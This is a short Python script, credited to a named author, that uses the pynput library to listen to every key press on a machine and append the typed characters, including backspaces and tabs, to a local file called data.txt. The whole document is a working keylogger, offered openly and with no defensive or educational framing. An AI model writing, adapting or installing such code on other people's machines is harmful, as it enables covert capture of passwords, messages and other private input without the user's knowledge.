#Author = Uphar Jaiswal

from pynput.keyboard import Listener

def strokes(key):
    letter=str(key)
    letter=letter.replace("'","")

    if letter == "Key.space":
        letter = " "

    if letter == "Key.enter":
        letter = "\n"

    if letter == "Key.backspace":
        letter = "{bksp}"

    if letter == "Key.tab":
        letter = "{tab}"   

    if letter == "Key.shift" or letter == "Key.shift_r": 
        letter = ""

    if letter == "Key.ctrl_l" or letter == "Key.ctrl_r":
        letter = ""           

    with open("data.txt", 'a') as f:
        f.write(letter)

with Listener(on_press=strokes) as listener:
    listener.join()